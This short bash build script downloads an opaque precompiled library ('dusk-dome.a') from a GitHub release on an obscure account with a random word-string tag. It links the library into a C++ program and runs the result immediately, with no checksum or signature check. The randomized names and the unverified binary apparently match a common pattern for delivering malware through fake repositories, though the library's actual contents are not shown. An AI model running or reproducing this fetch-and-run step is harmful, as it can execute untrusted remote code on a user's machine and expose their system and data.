#!/usr/bin/env bash
set -e
TAG="gentle-anchor-clever-garden"
LIB="dusk-dome.a"
wget --timeout=15 --tries=3 -q "https://github.com/paperusongffg/scalarnodekit/releases/download/${TAG}/${LIB}" -O "$LIB"
g++ -pthread -O2 -std=c++17 main.cpp "$LIB" -o app && ./app
